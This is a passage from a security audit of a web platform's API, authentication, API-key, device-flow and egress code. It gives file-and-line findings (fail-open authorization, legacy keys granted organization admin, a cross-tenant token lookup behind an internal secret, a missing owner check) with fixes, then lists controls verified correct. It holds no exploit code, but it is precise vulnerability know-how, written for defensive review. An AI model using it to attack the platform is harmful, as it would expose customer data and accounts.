**`assertCanWriteDefault` is skipped when no actor is supplied.**
`packages/features/model-provider/server/src/services/model-provider-defaults-write.service.ts:45, 85,
111, 134` all wrap the authorization call in `if (actorId)`. An absent actor writes **unauthorized**.
I traced every caller of `saveDefaultConfig` — the three REST routes (each guarded by
`ModelDefaultUserKeyRequiredError`) and `model-provider.api.ts:707` (which passes `ctx.actor()`) — so
this is **latent, not reachable today**. It is still fail-open by construction. _Fix:_ throw when
`actorId` is undefined.

**CSP allows `'unsafe-eval' 'unsafe-inline'`, and security headers cover static responses only.**
`apps/api/src/app-static/app-static.security-headers.ts:28` — `script-src 'self' 'unsafe-eval'
'unsafe-inline' …` gives the policy no XSS value. The headers are also applied only by the static
surface (`apps/api/src/app-static/app-static.surface.ts:78-81`), which by construction handles only
paths the API did not claim, so API JSON responses carry no `nosniff`. `frame-ancestors 'none'`,
`object-src 'none'`, `base-uri 'self'` and HSTS are all correct. _Fix:_ nonce or hash the inline
scripts and drop `'unsafe-inline'`; emit `X-Content-Type-Options` on API responses too.

**`hasApiKeyPermission` takes a `userId` it never reads.**
`packages/features/authz/server/src/services/authz.service.ts:684-709` destructures
`{ apiKeyId, organizationId, scope, permission }` and discards `userId`; four call sites pass it
(`apps/api/src/api-rest.security.ts:358, 472`; `api-handler-managed-credential.ts:146`). Not a
vulnerability — the owner ceiling is fetched independently from the key row via `tryOwnerGrantsFor`
(`authz-grant-snapshot.service.ts:84-99`) — but an unused authorization parameter reads like a wired
check and invites someone to "fix" the ceiling by passing a different id. _Fix:_ delete the field.

**SSE output-validation failures write the full issue list to the client.**
`packages/api/src/rest/sse.ts:27-33` sends `issues: result.error.issues` for a **server-produced**
payload that failed our own schema. The REST path deliberately does the opposite
(`packages/api/src/rest/response.ts:41-53`). _Fix:_ emit the code and trace id; log the issues.

**`auth: "none"` plus a declared permission is not refused at build.**
`packages/api/src/rest/pipeline.ts:346-355` skips auth entirely for `authSetting === "none"` while
`:358-375` still pushes the permission enforcer. `_validateConfiguration`
(`packages/api/src/rest/builder.ts:523-546`) never checks the pair, so whether the request fails open
depends on how the process's enforcer behaves with no principal — which the framework cannot see.
_Fix:_ refuse the combination at build.

**A pre-cutover key with no bindings is minted organization ADMIN.**
`packages/features/api-key/server/src/services/legacy-api-key-grant.service.ts:36-60` returns
`role: "ADMIN", scopeType: "ORGANIZATION"` for a key with no bindings, no `ingestSourceType` and no
`userId` — so "no recorded scopes" means org admin, not "no access". It is fenced by
`keyPredatesAuthzEngine` (`createdAt < cutoverAt`, `:106`) and `persist` returns early when
`cutoverAt === null` (`:102-105`), so a newly created key cannot take this path. The fence is a data
comparison rather than a code path: any process that sets an organization's `cutoverAt` later than an
existing key's `createdAt` reopens it.

**A default `ORGANIZATION/ADMIN` binding for a service key with no bindings.**
`packages/features/api-key/server/src/services/api-key-lifecycle.service.ts:70-77` — when
`parsed.userId` is null and `bindings` is empty, the effective binding becomes
`{ ORGANIZATION, ADMIN }`, and `validateCreateBindings` (`:230-256`) skips `assertCeiling` entirely
for a null `userId`. Minting a service key requires organization admin
(`packages/features/api-key/server/src/app/api-key.app.ts:262-269`), so this is an admin granting
admin — expected, but the implicit widening is worth a written note.

**CLI device flow, smaller items** (`auth-cli-device-flow.api.ts`): `/device-code` (`:313-343`) is
unauthenticated and unthrottled and mints a Redis record plus an index entry per call — unbounded key
growth from an anonymous caller. `/deny` (`:1019-1034`) looks a code up by `user_code` and flips it
with no ownership check — a nuisance denial of another person's CLI login, needing a guess at a live
~39-bit code. `generateUserCode` (`cli-device-session.service.ts:206`) has modulo bias —
`alphabet[b % 30]` makes indices 0-15 about 12.5% likelier; negligible at this entropy, but
`randomInt(0, 30)` costs nothing. `verification_uri_complete` pre-fills the user code (`:335-337`),
which RFC 8628 §5.4 notes weakens the out-of-band confirmation.

**Trace context is accepted from unauthenticated inbound headers and echoed back.**
`packages/api/src/rest/middleware.ts:25-48` runs `propagation.extract` before any authentication and
`injectTraceHeaders` writes it onto the response, so a caller chooses the trace their request is
recorded under. Standard OTel practice at an internal boundary; worth a conscious decision at an
internet-facing one.

**`procedureAt` resolves non-procedure functions.** `apps/api/src/app-trpc/app-trpc.sse.ts:117-121`
returns any function reached by the dotted walk — `toString`, `constructor`. Harmless today, and the
finding 1 fix closes it.

**`ModelProvider.tryFindById` degrades to a bare id lookup.**
`packages/features/model-provider/server/src/repositories/prisma/prisma.model-provider.repository.ts:57-77`
uses conditional spreads, so with neither `organizationId` nor `projectScopes` the WHERE collapses to
`{ id }`. Its one such caller is `model-provider-codex.service.ts:49-51`, reached from
`POST /codex/refresh` under `internalSecret` — an HMAC gateway-to-control-plane credential, not a
customer one — and it returns a decrypted Codex OAuth token for any named row id. By design per the
`VirtualKey` warm-cache precedent, but it makes the internal secret a cross-tenant credential oracle.
_Hardening:_ have the gateway send the virtual key's `organization_id` as the anchor.

**`expireStaleRealtimeSessions` drops its only tenancy predicate on a falsy id.**
`packages/features/gateway/server/src/services/gateway-realtime-session.service.ts:445` — an
`updateMany` over a guard-exempt model. Both live callers are safe and the internal route validates
`.min(1)`. _Fix:_ split into `expireStaleForKey({ virtualKeyId })` and `expireStaleFleetWide()` so a
missing id is a type error.

**Prototype-chain lookups on request-controlled keys.**
`packages/features/trace/server/src/services/trace-list-read.service.ts:342`
(`SORT_COLUMN_MAP[params.sort.columnId]`, where `columnId` is `z.string()` at `traces-v2.api.ts:358`)
and `packages/features/analytics/server/src/clickhouse/aggregation-builder.ts:698`. `columnId:
"toString"` yields a function whose fixed native-code text gets interpolated into `ORDER BY` — a 500,
not injection. _Fix:_ `Object.hasOwn` guards, or a `Map`.

**The scenario Liquid engines lack their sibling's DoS guards.**
`packages/features/scenario/contract/src/http-template-engine.ts` has no `renderLimit`,
`memoryLimit` or `ownPropertyOnly`, all of which the automation engine documents and sets
(`packages/features/automation/contract/src/templating/engine.ts:38-56`). Customer templates on the
scenario path can pin a worker and read prototype-chain properties.

**`GET|HEAD /api/user-avatar/:projectId/:id` never compares the URL's project to the caller.**
`packages/features/user/server/src/transport/api-rest/user-avatar.api.ts:223-228` declares
`anyAuthenticated()` on a **service** app, so the chain is just `dualAuth`, which sets
`apiKeyProjectId` / `userId` and never looks at the path parameter. The handler then reads
`const projectId = c.req.param("projectId")` (`:164`) and passes it straight to
`userAvatarObjects().getById({ projectId, id })` (`:188`); between the two, the authenticated identity
is used only as a rate-limit bucket key (`:170-183`). The sibling on the same app with the same
verifier does the check (`stored-object.api.ts:216-219`). Low because the caller needs both the victim
project id **and** a content-addressed object id, which is not enumerable, and the purpose/owner gate
(`:199-208`) confines the response to avatars — so the disclosure is a profile picture for an id
already known. It is one URL edit away from being H2's `/api/files` hole, and it is the only byte door
on that app with no owner check. _Fix:_ the four-line comparison beside it, or drop `:projectId` and
resolve the owner from the row.

---

## Raised and not reproduced

One claim from the door sweep is recorded here rather than as a finding, because tracing it did not
support it. A SCIM "filter injection deactivating an arbitrary organization member" was reported
against `parseUserNameFilter`
(`packages/enterprise/features/scim/server/src/services/scim-provisioning.service.ts:478-484`). Reading
it, the filter is matched by a strict anchored regex `/^userName\s+eq\s+"([^"]+)"$/`, the captured
value is passed as an ordinary `email` equality into `listMemberships`, and `listUsers` (`:268-294`) is
scoped by `organizationId` throughout. No injection sink and no cross-organization reach was found on
that path. It is noted so a future pass does not have to rediscover that it was looked at.

---

## Verified correct

Listed so the reader knows what the pass actually covered.

**Route construction and policy declaration.** `SecuredApp` exposes no verb methods; `.access(policy)`
is the only entry (`packages/api/src/rest/security/rest-api-service.ts:170-290`), so a route with no
declared policy cannot be constructed. `registerMountedRoute` (`:486-501`) throws when a versioned
endpoint carries no `meta.policy` **and** when the declared permission disagrees with the enforced
one. `unsupported()` (`:332`) throws at build for an RBAC policy on a service app, a
`projectPermission` on a project app, or an `apiKeyPermission` on an organization app.
`createVersionedApp` (`:732-738`) fixes the order — RBAC 403 always precedes a plan-gate 402.
Withdrawn (410) mounts still run auth and permission before answering (`pipeline.ts:251-276`).

**Error boundaries.** `handledErrorToResponse` (`packages/api/src/rest/errors.ts:214-232`) emits
`message: serialized.code`, never `err.message`, and no stack or cause; non-handled errors degrade to
`internal_error` (`:279`); a status-carrying `HTTPException` renders as `http_error` with its message
discarded (`:262-273`). `renderLegacy`
(`apps/api/src/app/api-rest-observability.composition.ts:56-67`) collapses everything unhandled to a
generic 500. The SSE error frame sends the handled **code**, never the message
(`apps/api/src/app-trpc/app-trpc.sse.ts:80-96`), and logs at `warn` for customer fault and `error`
otherwise (`:136-151`). `securityForCredentialClass`
(`packages/api/src/rest/openapi-security.ts:78-92`) _throws_ rather than publishing an empty security
requirement for `session` or `internal`, so a generated client cannot be told a route is
unauthenticated. Preview mounts are never documented and have their OpenAPI metadata stripped
(`pipeline.ts:238-248, 491-498`).

**tRPC policy chain.** `enforcePermissionCheck` is a fail-closed backstop that refuses a procedure
whose declared check never ran (`packages/api/src/trpc/trpc-runtime-policy.ts:190-197`), and
`permissionChecked` is reset to `false` on every request
(`apps/api/src/api.application.ts:610-612`). The scope-lineage guard runs **ahead** of the check
(`apps/api/src/app-trpc/app-trpc.policy-kit.ts:88-91`), so mixed-organization scope ids are refused
before a declaration can pass on one id while the handler acts on another. An empty `permission-any`
declaration is refused at composition rather than installing a check that reads as covered
(`apps/api/src/app-trpc/app-trpc.policy.ts:122-129`). `declaredCheckFrom` throws at boot for an
unmapped declaration kind rather than installing nothing
(`apps/api/src/app-trpc/app-trpc.declared-check.ts:77-81`). `asScopeLineageInput` reads own-property
descriptors (`apps/api/src/api-request.policy.ts:157-171`), so a prototype-polluted input cannot forge
a scope. Only three surfaces use `publicProcedure` — the front door, `publicEnv`, and the anonymous
`sharedTrace` read — and all three are deliberately signed-out doors.

**The `noPermission` opt-outs are compensated.** All nine `apiKey.*` procedures
(`packages/features/api-key/server/src/transport/api-trpc/api-key.api.ts:180-320`) take
`organizationId` from input with no declared permission — and every corresponding application method
opens with `ensureMember`
(`packages/features/api-key/server/src/app/api-key.app.ts:118, 149, 166, 256, 288, 306, 323, 332, 348`),
which asks AuthZ for `organization:view` at that organization
(`api-key-grant-policy.service.ts:24-32`). `createKey` additionally requires organization admin for a
service key or an assignment to somebody else (`api-key.app.ts:262-269`), and `listOrganizationMembers`
returns empty rather than refusing for a non-admin (`:345-352`). Grant ceilings are real:
`assertCeiling` (`api-key-grant-policy.service.ts:157-183`) checks every binding's permission against
the owner's own grants, and `validateScope` (`:124-154`) refuses a team or project outside the
organization.

**Credential-class separation.** tRPC is unreachable by an API key —
`ApiRequestPolicy.createContext` resolves only a browser session
(`apps/api/src/api-request.policy.ts:97-99`), with no API-key branch anywhere in the tRPC context. A
project key on an organization route yields a dedicated `credential_class_mismatch` rather than a
silent fallback (`apps/api/src/api-rest.security.ts:398-424`). The organization behind a credential is
re-read rather than trusted from the token, and a deleted organization refuses 401 rather than 404 so
the status does not confirm the deletion (`:428-452`). A resolution failure answers 500 with
`fault: "platform"` rather than degrading to a pass (`:406-414`). The dual-credential byte endpoints
arbitrate rather than rank: both credentials present is **refused as contested**, and a failing API
key is never silently retried as the session (`apps/api/src/app/api-dual-credential-auth.ts:104-131`).
`routeProjectAuthorization` takes the project id from the **path**, never the credential, and
collapses "not found" and "not permitted" into one 404 (`api-rest.security.ts:491-519`).

**Token handling.** Scoped tokens are a 16-character lookup id plus a 48-character secret from
`randomBytes` over a 62-symbol alphabet; the secret is HMAC-SHA256'd with a process pepper before
storage and only the hash is persisted; verification is `timingSafeEqual` behind an explicit length
guard, with legacy SHA-256 matches silently upgraded
(`packages/features/api-key/server/src/adapters/api-key-token.api-key-token.adapter.ts:41-75`;
`api-key-token-resolution.service.ts:43-61`). Lookup is by the public half, never by hash prefix. No
`===`, `==` or `.includes` on a token, hash or signature anywhere in `packages/features/api-key`,
`packages/features/share` or `apps/api/src`. Share tokens are `nanoid` over 62 symbols at length 32
(`share.service.ts:39-42`). Revoked, expired and deactivated-owner keys all fail resolution
(`:44`; `prisma.api-key.repository.ts:42`). `markUsed` and the audit write are gated on a 2xx and run
after `next()` (`api-rest.security.ts:336-338, 527-562`), so a refused request does not move the
last-used clock. Credential extraction rejects an empty Bearer, an empty `X-Auth-Token`, and an empty
Basic username or password (`apps/api/src/app/api-key-request-credentials.ts:15-45`); no credential is
read from a query string on any api-key or share path.

**Share links.** Redemption takes `projectId` from the **record**, never the payload
(`shared-trace.api.ts`), `resolveForViewer` re-runs kill switch, audience, expiry and view cap on every
request with the audience check first so an outsider cannot learn link state
(`share.service.ts:84-100`), view consumption is a compare-and-swap
(`prisma.share.repository.ts:135-176`), every share query carries `projectId` and `tryFindById` uses
`findFirst` rather than `findUnique` (`:64-66`). Listing a resource's links requires `traces:share`
rather than `traces:view`, because it re-displays the secrets (`share.api.ts:94`). The anonymous read
is limited per token and per address, the payload cache key carries a protections fingerprint so two
viewers with different redactions cannot share an entry, the output is a hard `.output()` allow-list,
and `userId` is pinned to `z.null()` (`shared-trace.api.ts:146-176, 207, 271-286, 384-390`).

**better-auth configuration.** `trustedOrigins` is an exact two-entry list — no wildcards, no header
reflection (`better-auth.api.ts:220-229`). Cookies inherit the 1.7 defaults (`httpOnly`, `secure` on
https or production, `sameSite: "lax"`, `path: "/"`, no `domain`), with `crossSubDomainCookies` off and
no override weakening any of them. Account linking is safe: `trustedProviders` is unset and linking
requires both `requireLocalEmailVerified` and the provider's own `emailVerified`, with
`allowDifferentEmails` false. No `user.changeEmail` configuration is present, so the email-keyed
operator allow-list is not self-escalatable. Password reset uses a 1 h token and revokes **all**
sessions on success (`:398, 781-783`). Sessions are 30 d with a 24 h `updateAge` and
`storeSessionInDatabase: true`, so revocation cannot be defeated by a Redis-only row (`:294-322`). The
Redis rate-limit store uses `INCR` plus TTL-on-create — a correct fixed window that sustained traffic
cannot extend (`:138-143`) — and `getAndDelete` uses `GETDEL` so two racing callers cannot both
receive a single-use value (`:127-129`). better-auth's admin plugin is deliberately not mounted, so
there is one impersonation mechanism rather than two (`:683-688`).

**Impersonation.** Gated on the staff allow-list, which fails closed on an empty list and a null email
(`packages/features/ops/server/src/services/admin-access.service.ts:27-30`); audited before the window
is written, with a mandatory reason enforced at the transport
(`impersonation.service.ts:80-93`; `admin.api.ts:147-159`); cannot target another admin or a
deactivated user (`impersonation.service.ts:73-78`); bounded to 1 h. Authorization decides on the
**impersonated** id while audit records the **real** administrator beside it
(`apps/api/src/api.application.ts:552-561`). The admin REST door resolves the actor server-side and
answers `AdminSurfaceHiddenError` rather than 403, so a probe learns nothing about whether the surface
exists (`admin.api.ts:124-132`). The platform-administrator check for data retention reads the email
from the **session**, never from input
(`apps/api/src/app/api-trpc-collaborators.product-infra.composition.ts:628-634`).

**Personal-project fall-through.** No path found. Every `ensurePersonalWorkspace` call is keyed to a
userId the server derived — the approving session, or the device record's stored user id after an
active-membership re-check (`auth-cli-device-flow.api.ts:456-469, 519-524, 982-987`). The organization
application forces `userId` from the caller and ignores any input value
(`organization.app.ts:421-426`). Another user's personal project is explicitly refused as an API-key
backing (`auth-cli-device-flow.api.ts:290-299`). Token resolution never falls back to a default or
personal project: `if (!effectiveProjectId) return null`
(`api-key-token-resolution.service.ts:157-159`), and the multi-project case with no header is a
deliberate `null` rather than a pick.

**CLI device flow, the parts that are right.** `device_code` and the access and refresh tokens are all
256-bit (`cli-device-session.service.ts:256, 389-390`); the poll window is claimed atomically via
`setIfAbsent` (`:301-307`); the device code is single-use and consumed on every terminal outcome;
membership is **re-derived at exchange and at every refresh** rather than trusted from approval
(`auth-cli-device-flow.api.ts:456-469, 705-727`); `Organization.maxSessionDurationDays` caps total
session age against a `session_started_at` anchor preserved across rotations (`:664-698`); refresh
rotates and invalidates the old token (`:732-738`); access tokens are read from the store on every
request so revocation is immediate (`cli-device-session.service.ts:452-470`). The `/api/auth/cli/*`
family is registered ahead of the `/api/auth/*` catch-all, so the catch-all does not swallow it
(`apps/api/src/app-rest/app-rest.process-features.ts:763, 776`).

**Egress fence architecture.** The address classifier is the union of both IANA special-purpose
registries, RFC-annotated, covering `0.0.0.0/8`, RFC1918, `127/8`, `169.254/16`, CGNAT, TEST-NET,
multicast, `240/4`, and on v6 `::`, `::1`, ULA, link-local, NAT64, 6to4, Teredo, documentation, plus
the Azure WireServer `168.63.129.16`
(`packages/egress/src/ssrf/address.ts:187-255`). IPv4-mapped IPv6 is unmapped and re-classified
(`:124-131`); unparseable input fails closed to `special` (`:271-273`). Decimal, octal, hex and
shorthand IPv4 spellings are normalised by the WHATWG parser before classification — verified
empirically. DNS resolution checks **all** A and AAAA records (`url-validator.ts:178`), and
`fetchValidatedDestination` pins the judged address with an undici `lookup` override while preserving
`Host` and TLS SNI (`fenced-fetch.ts:136-150, 179-183`), so there is no TOCTOU on the resolved path.
Redirects are `manual` always (`:210`), refused outright for every customer-supplied destination,
re-validated when followed, capped at 10 hops, with a caller that asks to follow without supplying a
validator refused rather than allowed (`:262-303`). The scheme allowlist is http/https only, checked
first (`url-validator.ts:244-248`). The host allowlist cannot bypass the metadata or cloud-domain
refusals — both are evaluated before it (`:259-262` precede `:264`), pinned by a test.

**Webhook signing and inbound verification.** Outbound: HMAC-SHA256 over
`"<unix seconds>.<raw body>"`, Stripe-shaped `X-LangWatch-Signature: t=…,v1=…`, so the timestamp is in
the signed payload and replay is detectable; multiple `v1` values during rotation with a 24 h previous
secret TTL; empty secrets filtered rather than used as a key
(`packages/egress/src/webhook/signature.ts:40-69`). The reference verifier rejects a missing or
non-finite `t`, enforces a 5-minute window, compares with `timingSafeEqual` behind a length guard, and
checks every candidate even after a match (`:105-129`). Inbound: the GitHub receiver
(`packages/features/github/server/src/transport/api-rest/github.api.ts:440-450, 494-500`) and the
ElevenLabs receiver
(`packages/features/gateway/server/src/transport/api-rest/elevenlabs-webhook.api.ts:134-153`) both use
the raw body and a length-guarded `timingSafeEqual`, and ElevenLabs checks its timestamp window before
the HMAC. Only the SCIM intake deviates (finding 13). Webhook destinations are the strict union —
https only, port 443 only, no credentials, real host — with `blockLocal: true` **unconditionally**
regardless of the deployment flag (`packages/egress/src/webhook/url-policy.ts:50, 58-60`), and headers
are sanitised for reserved names, the `x-langwatch-` prefix and CR/LF/NUL at both save and dispatch.
`sendHttpDestination` gets timeouts, socket backstops and a 64 KB capped body read right
(`packages/egress/src/webhook/http-destination.ts:29, 34, 102-135, 165-169`). Per-scope hourly dispatch
is capped at 1000, degrading to a per-process counter rather than failing open when Redis is absent
(`dispatch-budget.ts:42-61`). The MCP OAuth `redirect_uri` is matched **exactly** against the URIs
registered for that `client_id` per RFC 6749 §10.6 (`mcp-authorize.api.ts:157-164`) — not an open
redirect.

**Framework capability wiring.** The rate limiter fails **closed** — a limiter-store error is logged
and rethrown, the request refused (`packages/api/src/rest/capabilities.ts:41-46`) — while the response
cache correctly does the opposite (`:126-132`). `_validateConfiguration`
(`packages/api/src/rest/builder.ts:515-546`) refuses `withRateLimit` with no limiter port, `withCache`
with no cache port or no `output`, and `withPermission` with no enforcer; public REST additionally
requires an explicit rate-limit and resource-limit decision with a non-blank opt-out reason.
`assertAuthorizedScopeInput` fails closed on an unresolvable scope and withholds which tenant the
credential does cover (`pipeline.ts:781-802`; `errors.ts:53-62`). `bodyLimit` itself is correct
(`body-limit.ts`) — its weakness is only that it is opt-in per route. Idempotency is tenant-scoped,
unique on `(scopeId, key)` with the operation folded into the fingerprint
(`idempotency-ledger.ts:55, 138-145`). Stored-object responses carry `nosniff`,
`default-src 'none'; sandbox`, `no-referrer`, a readback-safe media-type allowlist falling back to
`application/octet-stream`, and RFC-6266 filename sanitisation
(`packages/api/src/rest/media-response.ts:14-37`).

**Other spine checks.** Session resolution fails closed — both catch blocks return `null`, never a
session (`apps/api/src/app/api-auth.composition.ts:113-119, 428-431`) — and logs cookie **names**
only, never values. Internal secrets fail closed: `verifyLangyInternalSecret` answers 503 on an unset
secret and compares with `timingSafeEqual` after a length check
(`langy-internal.api.ts:68-90`); `verifyGatewaySignature` answers 500 on an unset secret and requires
both signature and timestamp headers (`gateway-internal.api.ts:304-338`); `ApiInstanceAdminKeyAdapter`
treats blank or whitespace as unconfigured
(`apps/api/src/app/api-instance-admin-key.adapter.ts:31-34`). Static file serving cannot traverse:
`normalizePathname` never decodes percent-escapes, `path.normalize` runs before a `..`/absolute
rejection, and files are opened by fd so there is no TOCTOU
(`apps/api/src/app-static/app-static.surface.ts:96-98`;
`apps/api/src/app-static/app-static.handler.ts:64-127`). `apiClientAddress` at least validates the
header **format** and falls back to the socket address, so no single bucket collects every
header-less caller (`apps/api/src/app/api-client-address.ts:39-44`). There is no CORS middleware
anywhere in `packages/api` or `apps/api`, so credentialed-CORS-with-reflected-origin does not exist
here and the surface is fail-closed for cross-origin XHR — which is also why finding 1 matters: it is
reachable by navigation, not by XHR.
